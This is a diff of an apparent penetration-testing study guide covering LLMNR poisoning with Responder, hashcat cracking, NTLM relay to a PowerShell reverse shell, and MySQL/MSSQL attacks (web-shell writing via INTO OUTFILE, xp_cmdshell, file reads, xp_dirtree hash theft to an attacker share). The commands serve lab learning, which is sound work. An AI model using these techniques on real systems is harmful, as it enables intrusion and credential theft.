-# [*] [MDNS] Poisoned answer sent to <TARGET_IP>   for name mysharefoder.local
-# [SMB] NTLMv2-SSP Client   : <TARGET_IP>
-# [SMB] NTLMv2-SSP Username : WIN7BOX\demouser
-# [SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:<NTLM_SERVER_CHALLENGE>:<NTLMV2_RESPONSE>:<NTLMV2_BLOB>
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
+
+  To support this project:
+  Patreon -> https://www.patreon.com/PythonResponder
+  Paypal  -> https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+...
+
+
+[+] Listening for events...
+
+...
 ```
+
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td colspan="2"> 📄 <b>Responder — Captured Hashes</b> </td></tr>
+<tr><td colspan="2">
+
+```
+[*] [NBT-NS] Poisoned answer sent to <TARGET_IP> for name WORKGROUP (service: Domain Master Browser)
+[*] [NBT-NS] Poisoned answer sent to <TARGET_IP> for name WORKGROUP (service: Browser Election)
+[*] [MDNS] Poisoned answer sent to <TARGET_IP>   for name mysharefoder.local
+[*] [LLMNR]  Poisoned answer sent to <TARGET_IP> for name mysharefoder
+[*] [MDNS] Poisoned answer sent to <TARGET_IP>   for name mysharefoder.local
+[SMB] NTLMv2-SSP Client   : <TARGET_IP>
+[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
+[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:<NTLM_SERVER_CHALLENGE>:<NTLMV2_RESPONSE>:<NTLMV2_BLOB>
+```
+
+</td></tr>
+</table>
 
 These captured credentials can be cracked using hashcat or relayed to a remote host to complete the authentication and impersonate the user.
 
@@ -1251,44 +1640,77 @@ All saved Hashes are located in Responder's logs directory (**`/usr/share/respon
 
 **Step 2: Use hashcat to crak the password:**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 ```
-```bash
-# hashcat (v6.1.1) starting...
 
-# ...
+</td></tr>
+<tr><td colspan="2">
 
-# Dictionary cache hit:
-# * Filename..: /usr/share/wordlists/rockyou.txt
-# ...
+---
 
-# ADMINISTRATOR::WIN7BOX:<NTLM_SERVER_CHALLENGE>:<NTLMV2_RESPONSE>:<NTLMV2_BLOB>:P@ssword
+```
+hashcat (v6.1.1) starting...
 
-# Session..........: hashcat
-# Status...........: Cracked
-# Hash.Name........: NetNTLMv2
-# Hash.Target......: ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc...000000
-# ...
+...
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+...
+
+ADMINISTRATOR::WIN7BOX:<NTLM_SERVER_CHALLENGE>:<NTLMV2_RESPONSE>:<NTLMV2_BLOB>:P@ssword
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: NetNTLMv2
+Hash.Target......: ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc...000000
+...
 ```
 
+</td></tr>
+</table>
+
 The captured NTLMv2 hash was successfully cracked, revealing the password: **`P@ssword`**.
-If the hash cannot be cracked, it may still be leveraged through a relay attack. This can be achieved using tools such as `impacket-ntlmrelayx` or Responder’s `MultiRelay.py`.
+If the hash cannot be cracked, it may still be leveraged through a relay attack. This can be achieved using tools such as `impacket-ntlmrelayx` or Responder's `MultiRelay.py`.
 
 **Step 3: Disable SMB in Responder:**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 sudo sed -i 's/^SMB = .*/SMB = Off/' /etc/responder/Responder.conf
 ```
 
+</td></tr>
+</table>
+
 **Verify change:**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 cat /etc/responder/Responder.conf | grep 'SMB ='
 ```
-```bash
-# SMB = Off
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
 ```
+SMB = Off
+```
+
+</td></tr>
+</table>
 
 **Step 4: Generate a PowerShell Reverse Shell**
 
@@ -1297,29 +1719,53 @@ Set the local IP, port, and generate the encoded command.
 
 **Step 5: Start a Netcat Listener**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 nc -lvnp <PORT>
 ```
-```bash
-# listening on [any] 9001 ...
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
+listening on [any] 9001 ...
 ```
 
+</td></tr>
+</table>
+
 **Step 6: Execute the NTLM Relay Attack**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c 'powershell -e <BASE64_STRING>'
 ```
-```bash
-# listening on [any] 9001 ...
-# connect to [10.10.110.133] from (UNKNOWN) [<TARGET_IP>] 52471
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
+listening on [any] 9001 ...
+connect to [10.10.110.133] from (UNKNOWN) [<TARGET_IP>] 52471
 
 PS C:\Windows\system32> whoami;hostname
 
-# nt authority\system
-# WIN11BOX
+nt authority\system
+WIN11BOX
 ```
 
-
+</td></tr>
+</table>
 
 </details>
 
@@ -1335,89 +1781,105 @@ PS C:\Windows\system32> whoami;hostname
 [MySQL](https://www.mysql.com/) and [Microsoft SQL Server (MSSQL)](https://www.microsoft.com/en-us/sql-server/sql-server-2019) are [relational database](https://en.wikipedia.org/wiki/Relational_database) management systems (RDBMS). They store data in tables, organized into columns and rows.
 
 Most relational database systems, including MSSQL and MySQL, rely on [Structured Query Language (SQL)](https://en.wikipedia.org/wiki/SQL) for:
-* Querying data
-* Maintaining and managing the database
+
+- Querying data
+- Maintaining and managing the database
 
 **Why Databases Are High-Value Targets**
 
 Databases are prime targets for attackers because they often contain sensitive and business-critical information, such as:
-* User credentials
-* Personally Identifiable Information (PII)
-* Business-related records
-* Payment information
+
+- User credentials
+- Personally Identifiable Information (PII)
+- Business-related records
+- Payment information
 
 **Security Risks**
 
 Database services are frequently configured with highly privileged users. If an attacker gains access to a database, they may be able to:
-* Exploit elevated privileges
-* Move laterally within the system
-* Escalate privileges to gain wider control
+
+- Exploit elevated privileges
+- Move laterally within the system
+- Escalate privileges to gain wider control
 
 <details>
 <summary><h2>Nmap Scan</h2></summary>
 
 **Default SQL Ports**
 
-* MSSQL
-    * TCP/1433 (default)
-    * UDP/1434 (browser service)
-    * TCP/2433 (when running in hidden mode)
-* MySQL
-    *TCP/3306 (default)
+- MSSQL
+  - TCP/1433 (default)
+  - UDP/1434 (browser service)
+  - TCP/2433 (when running in hidden mode)
+- MySQL
+  \*TCP/3306 (default)
 
 **Example Command**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 sudo nmap <TARGET_IP> -Pn -sV -sC -p1433
 ```
-```bash
-# PORT     STATE SERVICE  VERSION
-# 1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
-# | ms-sql-ntlm-info: 
-# |   Target_Name: HTB
-# |   NetBIOS_Domain_Name: HTB
-# |   NetBIOS_Computer_Name: mssql-test
-# |   DNS_Domain_Name: HTB.LOCAL
-# |   DNS_Computer_Name: mssql-test.HTB.LOCAL
-# |   DNS_Tree_Name: HTB.LOCAL
-# |_  Product_Version: 10.0.17763
-# | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
-# | Not valid before: 2021-08-26T01:04:36
-# |_Not valid after:  2051-08-26T01:04:36
-# |_ssl-date: 2021-08-26T01:11:58+00:00; +2m05s from scanner time.
 
-# Host script results:
-# |_clock-skew: mean: 2m04s, deviation: 0s, median: 2m04s
-# | ms-sql-info: 
-# |   <TARGET_IP>:1433: 
-# |     Version: 
-# |       name: Microsoft SQL Server 2017 RTM
-# |       number: 14.00.1000.00
-# |       Product: Microsoft SQL Server 2017
-# |       Service pack level: RTM
-# |       Post-SP patches applied: false
-# |_    TCP port: 1433
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
+PORT     STATE SERVICE  VERSION
+1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
+| ms-sql-ntlm-info:
+|   Target_Name: HTB
+|   NetBIOS_Domain_Name: HTB
+|   NetBIOS_Computer_Name: mssql-test
+|   DNS_Domain_Name: HTB.LOCAL
+|   DNS_Computer_Name: mssql-test.HTB.LOCAL
+|   DNS_Tree_Name: HTB.LOCAL
+|_  Product_Version: 10.0.17763
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2021-08-26T01:04:36
+|_Not valid after:  2051-08-26T01:04:36
+|_ssl-date: 2021-08-26T01:11:58+00:00; +2m05s from scanner time.
+
+Host script results:
+|_clock-skew: mean: 2m04s, deviation: 0s, median: 2m04s
+| ms-sql-info:
+|   <TARGET_IP>:1433:
+|     Version:
+|       name: Microsoft SQL Server 2017 RTM
+|       number: 14.00.1000.00
+|       Product: Microsoft SQL Server 2017
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
 ```
 
-| Flag            | Purpose                                         |
-|-----------------|-------------------------------------------------|
-| `-Pn`           | Treat host as online (skip ICMP ping discovery) |
-| `-sV`           | Detect service version                          |
-| `-sC`           | Run default Nmap scripts                        |
-| `-p1433`        | Scan only port 1433 (SQL Server default)        |
-| `<TARGET_IP>`   | Target IP address                               |
+</td></tr>
+</table>
+
+| Flag          | Purpose                                         |
+| ------------- | ----------------------------------------------- |
+| `-Pn`         | Treat host as online (skip ICMP ping discovery) |
+| `-sV`         | Detect service version                          |
+| `-sC`         | Run default Nmap scripts                        |
+| `-p1433`      | Scan only port 1433 (SQL Server default)        |
+| `<TARGET_IP>` | Target IP address                               |
 
 **Why This Matters**
 
-* **Attackers look for open SQL ports** (1433/3306) as easy entry points.
-* **Weak or misconfigured authentication** can lead to:
-    * Full database access without credentials.
-    * Leakage of sensitive data (users, passwords, financial records).
-    * Remote code execution via SQL functions or stored procedures.
-* **Exposed metadata** (seen in Nmap output) reveals:
-    * SQL Server version (helps attackers find exploits).
-    * Domain, computer, and DNS names (useful for lateral movement).
-* **Default or no-password accounts** are commonly exploited in automated attacks.
+- **Attackers look for open SQL ports** (1433/3306) as easy entry points.
+- **Weak or misconfigured authentication** can lead to:
+  - Full database access without credentials.
+  - Leakage of sensitive data (users, passwords, financial records).
+  - Remote code execution via SQL functions or stored procedures.
+- **Exposed metadata** (seen in Nmap output) reveals:
+  - SQL Server version (helps attackers find exploits).
+  - Domain, computer, and DNS names (useful for lateral movement).
+- **Default or no-password accounts** are commonly exploited in automated attacks.
 
 </details>
 
@@ -1430,26 +1892,26 @@ MSSQL supports two authentication modes:
 
 | Authentication Type             | Description                                                                                                                                                                                  |
 | ------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| **Windows Authentication Mode** | Default mode (also called *integrated security*). SQL Server trusts Windows/Active Directory accounts. Users already authenticated by Windows do not need to provide additional credentials. |
+| **Windows Authentication Mode** | Default mode (also called _integrated security_). SQL Server trusts Windows/Active Directory accounts. Users already authenticated by Windows do not need to provide additional credentials. |
 | **Mixed Mode**                  | Supports both Windows/AD authentication and SQL Server–specific logins (username + password stored in SQL Server).                                                                           |
-
 
 **MySQL**
 
-* Supports authentication using:
-    * Username + Password
-    * Windows Authentication (requires plugin)
+- Supports authentication using:
+  - Username + Password
+  - Windows Authentication (requires plugin)
 
-* Administrators may choose an authentication mode based on compatibility, security, usability, etc.
-* Misconfigurations in authentication settings can expose services to unauthorized access.
+- Administrators may choose an authentication mode based on compatibility, security, usability, etc.
+- Misconfigurations in authentication settings can expose services to unauthorized access.
 
 <details>
 <summary><h3>Misconfigurations</h3></summary>
 
 A misconfiguration can allow access without credentials under these conditions:
-* Anonymous access enabled
-* User without a password
-* Unrestricted access
+
+- Anonymous access enabled
+- User without a password
+- Unrestricted access
 
 </details>
 
@@ -1458,14 +1920,14 @@ A misconfiguration can allow access without credentials under these conditions:
 
 Depending on the user's privileges, we may be able to perform different actions within a SQL Server, such as:
 
-* Read or change the contents of a database
-* Read or change the server configuration
-* Execute commands
-* Read local files
-* Communicate with other databases
-* Capture the local system hash
-* Impersonate existing users
-* Gain access to other networks
+- Read or change the contents of a database
+- Read or change the server configuration
+- Execute commands
+- Read local files
+- Communicate with other databases
+- Capture the local system hash
+- Impersonate existing users
+- Gain access to other networks
 
 </details>
 
@@ -1479,10 +1941,10 @@ Once access to a SQL database has been obtained, the next step is to enumerate i
 In practice, large environments may contain hundreds of tables, so it’s not always practical—or necessary—to dump everything.
 Instead, focus on the tables that are most likely to contain actionable information, such as:
 
-* Usernames and passwords
-* API keys or authentication tokens
-* Configuration data
-* Application-specific secrets
+- Usernames and passwords
+- API keys or authentication tokens
+- Configuration data
+- Application-specific secrets
 
 This targeted approach will not only save time, but also help you find data that can be leveraged for further compromise or privilege escalation.
 
@@ -1491,19 +1953,26 @@ This targeted approach will not only save time, but also help you find data that
 
 **Default System Databases**
 
-| Database           | Description                                                                                       |
-|--------------------|---------------------------------------------------------------------------------------------------|
-| `mysql`            | Core system database; contains tables required by the MySQL server                                |
-| `information_schema` | Stores metadata such as databases, tables, and columns                                           |
-| `performance_schema` | Used for monitoring MySQL server execution at a low level                                        |
-| `sys`              | Helper objects to make Performance Schema data easier to understand                               |
+| Database             | Description                                                         |
+| -------------------- | ------------------------------------------------------------------- |
+| `mysql`              | Core system database; contains tables required by the MySQL server  |
+| `information_schema` | Stores metadata such as databases, tables, and columns              |
+| `performance_schema` | Used for monitoring MySQL server execution at a low level           |
+| `sys`                | Helper objects to make Performance Schema data easier to understand |
 
 <details>
 <summary><h4>Step 1: Connecting to the SQL Server</h4></summary>
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 mysql -u <USER> -p<PASSWORD> -h <TARGET_IP>
 ```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -1512,65 +1981,117 @@ mysql -u <USER> -p<PASSWORD> -h <TARGET_IP>
 
 **Show Databases**
 
+<table width="100%">
+<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
+<tr><td width="20%">**`mysql>`**</td><td>
+
 ```sql
 SHOW DATABASES;
 ```
-```bash
-# +--------------------+
-# | Database           |
-# +--------------------+
-# | information_schema |
-# | users              |
-# +--------------------+
-# 2 rows in set (0.00 sec)
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| users              |
++--------------------+
+2 rows in set (0.00 sec)
 ```
 
+</td></tr>
+</table>
+
 **Use a Database**
+
+<table width="100%">
+<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
+<tr><td width="20%">**`mysql>`**</td><td>
 
 ```sql
 USE users;
 ```
-```bash
-# Database changed
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
+Database changed
 ```
 
+</td></tr>
+</table>
+
 **Show Tables**
+
+<table width="100%">
+<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
+<tr><td width="20%">**`mysql>`**</td><td>
 
 ```sql
 SHOW TABLES;
 ```
-```bash
-# +----------------------------+
-# | users                      |
-# +----------------------------+
-# | actions                    |
-# | permissions                |
-# | permissions_roles          |
-# | permissions_users          |
-# | roles                      |
-# | roles_users                |
-# | settings                   |
-# | users                      |
-# +----------------------------+
-# 8 rows in set (0.00 sec)
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
++----------------------------+
+| users                      |
++----------------------------+
+| actions                    |
+| permissions                |
+| permissions_roles          |
+| permissions_users          |
+| roles                      |
+| roles_users                |
+| settings                   |
+| users                      |
++----------------------------+
+8 rows in set (0.00 sec)
 ```
 
+</td></tr>
+</table>
+
 **View Table Contents**
+
+<table width="100%">
+<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
+<tr><td width="20%">**`mysql>`**</td><td>
 
 ```sql
 SELECT * FROM users;
 ```
-```bash
-# +----+---------------+------------+---------------------+
-# | id | username      | password   | date_of_joining     |
-# +----+---------------+------------+---------------------+
-# |  1 | admin         | p@ssw0rd   | 2025-07-02 00:00:00 |
-# |  2 | administrator | adm1n_p@ss | 2025-07-02 11:30:50 |
-# |  3 | john          | john123!   | 2025-07-02 11:47:16 |
-# |  4 | tom           | tom123!    | 2025-07-02 12:23:16 |
-# +----+---------------+------------+---------------------+
-# 4 rows in set (0.00 sec)
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
 ```
++----+---------------+------------+---------------------+
+| id | username      | password   | date_of_joining     |
++----+---------------+------------+---------------------+
+|  1 | admin         | p@ssw0rd   | 2025-07-02 00:00:00 |
+|  2 | administrator | adm1n_p@ss | 2025-07-02 11:30:50 |
+|  3 | john          | john123!   | 2025-07-02 11:47:16 |
+|  4 | tom           | tom123!    | 2025-07-02 12:23:16 |
++----+---------------+------------+---------------------+
+4 rows in set (0.00 sec)
+```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -1585,33 +2106,54 @@ For example, if **MySQL** is running alongside a PHP-based web server (or anothe
 
 **Write Local File**
 
+<table width="100%">
+<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
+<tr><td width="20%">**`mysql>`**</td><td>
+
 ```sql
 SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/shell.php';
 ```
+
+</td></tr>
+</table>
 
 ---
 
 In MySQL, the global system variable `secure_file_priv` restricts data import and export operations, including those performed by **LOAD DATA**, **SELECT … INTO OUTFILE**, and the **LOAD_FILE()** function. These operations are only available to users with the **FILE** privilege.
 
 `secure_file_priv` can be configured as follows:
-* **Empty value** → No restrictions are applied. This is considered insecure.
-* **Directory path** → Restricts import and export operations to that specific directory. The directory must already exist, as MySQL will not create it.
-* **NULL** → Completely disables import and export operations.
+
+- **Empty value** → No restrictions are applied. This is considered insecure.
+- **Directory path** → Restricts import and export operations to that specific directory. The directory must already exist, as MySQL will not create it.
+- **NULL** → Completely disables import and export operations.
 
 **Verify `secure_file_priv`**
+
+<table width="100%">
+<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
+<tr><td width="20%">**`mysql>`**</td><td>
 
 ```sql
 show variables like "secure_file_priv";
 ```
-```bash
-# +------------------+-------+
-# | Variable_name    | Value |
-# +------------------+-------+
-# | secure_file_priv |       |
-# +------------------+-------+
 
-# 1 row in set (0.005 sec)
+</td></tr>
+<tr><td colspan="2">
+
+---
+
 ```
++------------------+-------+
+| Variable_name    | Value |
++------------------+-------+
+| secure_file_priv |       |
++------------------+-------+
+
+1 row in set (0.005 sec)
+```
+
+</td></tr>
+</table>
 
 In the previous example, we can see the `secure_file_priv` variable is empty, which means we can read and write data using MySQL.
 
@@ -1621,19 +2163,32 @@ By default a MySQL installation does not allow arbitrary file read, but if the c
 
 **Read Local Files**
 
+<table width="100%">
+<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
+<tr><td width="20%">**`mysql>`**</td><td>
+
 ```sql
 select LOAD_FILE("/etc/passwd");
 ```
-```bash
-# +--------------------------+
-# | LOAD_FILE("/etc/passwd")
-# +--------------------------------------------------+
-# root:x:0:0:root:/root:/bin/bash
-# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-# bin:x:2:2:bin:/bin:/usr/sbin/nologin
-# sys:x:3:3:sys:/dev:/usr/sbin/nologin
-# sync:x:4:65534:sync:/bin:/bin/sync
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
 ```
++--------------------------+
+| LOAD_FILE("/etc/passwd")
++--------------------------------------------------+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -1644,41 +2199,62 @@ select LOAD_FILE("/etc/passwd");
 
 **Default System Databases**
 
-| Database | Description                                                                                          |
-|---------|------------------------------------------------------------------------------------------------------|
-| `master` | Stores configuration and instance-level information                                                 |
-| `msdb`  | Used by SQL Server Agent (job scheduling, alerts, etc.)                                              |
-| `model` | Template database that is copied when a new database is created                                     |
+| Database   | Description                                                                                     |
+| ---------- | ----------------------------------------------------------------------------------------------- |
+| `master`   | Stores configuration and instance-level information                                             |
+| `msdb`     | Used by SQL Server Agent (job scheduling, alerts, etc.)                                         |
+| `model`    | Template database that is copied when a new database is created                                 |
 | `resource` | Read-only database that stores system objects visible in all databases (under the `sys` schema) |
-| `tempdb` | Stores all temporary tables, variables and other transient objects used in SQL queries              |
+| `tempdb`   | Stores all temporary tables, variables and other transient objects used in SQL queries          |
 
 <details>
 <summary><h4>Step 1: Connecting to the SQL Server</h4></summary>
 
 **OPTION 1: `sqsh`**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 sqsh -S <TARGET_IP> -U <USER> -P '<PASSWORD>' -h
 ```
 
+</td></tr>
+</table>
+
 When connecting to a SQL Server using **Windows authentication**, the client must include either the **domain name** or the **hostname** in the username.
 If no hostname or domain is provided, the client defaults to **SQL authentication** and attempts to log in using a SQL Server–defined user.
 
-* **Windows authentication** (domain or local account):
-    * Domain account → `DOMAIN\username`
-    * Local account → `HOSTNAME\username` or `.\username`
-* **SQL authentication**:
-    * Username only → `username`
+- **Windows authentication** (domain or local account):
+  - Domain account → `DOMAIN\username`
+  - Local account → `HOSTNAME\username` or `.\username`
+- **SQL authentication**:
+  - Username only → `username`
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 sqsh -S <TARGET_IP> -U .\\<USER> -P '<PASSWORD>' -h
 ```
 
+</td></tr>
+</table>
+
 **OPTION 2: `mssqlclient.py`**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 python3 /usr/local/bin/mssqlclient.py -p <PORT> <USER>@<TARGET_IP>
 ```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -1687,64 +2263,124 @@ python3 /usr/local/bin/mssqlclient.py -p <PORT> <USER>@<TARGET_IP>
 
 **Show Databases**
 
+<table width="100%">
+<tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
+<tr><td width="20%">**`1>`**</td><td>
+
 ```sql
 SELECT name FROM master.dbo.sysdatabases;
 GO
 ```
-```bash
-# master
-# tempdb
-# model
-# msdb
-# users
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
 ```
+master
+tempdb
+model
+msdb
+users
+```
+
+</td></tr>
+</table>
+
 **Only show databases you truly have access**
 
-```bash
+<table width="100%">
+<tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
+<tr><td width="20%">**`1>`**</td><td>
+
+```sql
 SELECT name FROM sys.databases WHERE HAS_DBACCESS(name)=1 ORDER BY name;
 ```
 
+</td></tr>
+</table>
+
 **Use a Database**
+
+<table width="100%">
+<tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
+<tr><td width="20%">**`1>`**</td><td>
 
 ```sql
 USE users;
 GO
 ```
-```bash
-# Changed database context to 'users'.
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
+Changed database context to 'users'.
 ```
 
+</td></tr>
+</table>
+
 **Show Tables**
+
+<table width="100%">
+<tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
+<tr><td width="20%">**`1>`**</td><td>
 
 ```sql
 SELECT table_name FROM users.INFORMATION_SCHEMA.TABLES;
 GO
 ```
-```bash
-# actions
-# permissions
-# permissions_roles
-# permissions_users
-# roles
-# roles_users
-# settings
-# users
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
+actions
+permissions
+permissions_roles
+permissions_users
+roles
+roles_users
+settings
+users
 ```
 
+</td></tr>
+</table>
+
 **View Table Contents**
+
+<table width="100%">
+<tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
+<tr><td width="20%">**`1>`**</td><td>
 
 ```sql
 SELECT * FROM users;
 GO
 ```
-```bash
-# id   username       password       date_of_joining
-# ----------------------------------------------------------
-# 1    admin          p@ssw0rd       2025-07-02 00:00:00
-# 2    administrator  adm1n_p@ss     2025-07-02 11:30:50
-# 3    john           john123!       2025-07-02 11:47:16
-# 4    tom            tom123!        2025-07-02 12:23:16
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
 ```
+id   username       password       date_of_joining
+----------------------------------------------------------
+1    admin          p@ssw0rd       2025-07-02 00:00:00
+2    administrator  adm1n_p@ss     2025-07-02 11:30:50
+3    john           john123!       2025-07-02 11:47:16
+4    tom            tom123!        2025-07-02 12:23:16
+```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -1755,11 +2391,21 @@ Command execution is one of the most valuable capabilities when attacking common
 
 **Execute commands using SQL syntax on MSSQL**
 
+<table width="100%">
+<tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
+<tr><td width="20%">**`1>`**</td><td>
+
 ```sql
 xp_cmdshell 'whoami'
 GO
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # output
 # -----------------------------
 # no service\mssql$sqlexpress
@@ -1767,41 +2413,76 @@ GO
 # (2 rows affected)
 ```
 
+</td></tr>
+</table>
+
 If `xp_cmdshell` is not enabled, we can enable it.
 
 **Allow advanced options to be changed:**
+
+<table width="100%">
+<tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
+<tr><td width="20%">**`1>`**</td><td>
 
 ```sql
 EXECUTE sp_configure 'show advanced options', 1
 GO
 ```
 
+</td></tr>
+</table>
+
 **Update the currently configured value for advanced options:**
+
+<table width="100%">
+<tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
+<tr><td width="20%">**`1>`**</td><td>
 
 ```sql
 RECONFIGURE
 GO
 ```
+
+</td></tr>
+</table>
 
 **Enable the feature:**
 
+<table width="100%">
+<tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
+<tr><td width="20%">**`1>`**</td><td>
+
 ```sql
 EXECUTE sp_configure 'xp_cmdshell', 1
-GO  
+GO
 ```
 
+</td></tr>
+</table>
+
 **Update the currently configured value for this feature:**
+
+<table width="100%">
+<tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
+<tr><td width="20%">**`1>`**</td><td>
 
 ```sql
 RECONFIGURE
 GO
 ```
+
+</td></tr>
+</table>
 
 ---
 
 To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:
 
 **Enable Ole Automation Procedures:**
+
+<table width="100%">
+<tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
+<tr><td width="20%">**`1>`**</td><td>
 
 ```sql
 sp_configure 'show advanced options', 1
@@ -1814,7 +2495,14 @@ RECONFIGURE
 GO
 ```
 
+</td></tr>
+</table>
+
 **Write Local Files:**
+
+<table width="100%">
+<tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
+<tr><td width="20%">**`1>`**</td><td>
 
 ```sql
 DECLARE @OLE INT
@@ -1827,17 +2515,30 @@ EXECUTE sp_OADestroy @OLE
 GO
 ```
 
+</td></tr>
+</table>
+
 ---
 
 **Read Local Files:**
 
 By default, MSSQL allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:
 
+<table width="100%">
+<tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
+<tr><td width="20%">**`1>`**</td><td>
+
 ```sql
 SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
 GO
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # BulkColumn
 
 # -----------------------------------------------------------------------------
@@ -1851,6 +2552,9 @@ GO
 # (1 rows affected)
 ```
 
+</td></tr>
+</table>
+
 </details>
 
 <details>
@@ -1860,39 +2564,75 @@ We can capture the MSSQL service account hash by abusing the undocumented stored
 
 **XP_DIRTREE Hash Stealing**
 
+<table width="100%">
+<tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
+<tr><td width="20%">**`1>`**</td><td>
+
 ```sql
 EXEC master..xp_dirtree '\\10.10.110.17\share\'
 GO
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # subdirectory    depth
 # --------------- -----------
 ```
 
+</td></tr>
+</table>
+
 **XP_SUBDIRS Hash Stealing**
+
+<table width="100%">
+<tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
+<tr><td width="20%">**`1>`**</td><td>
 
 ```sql
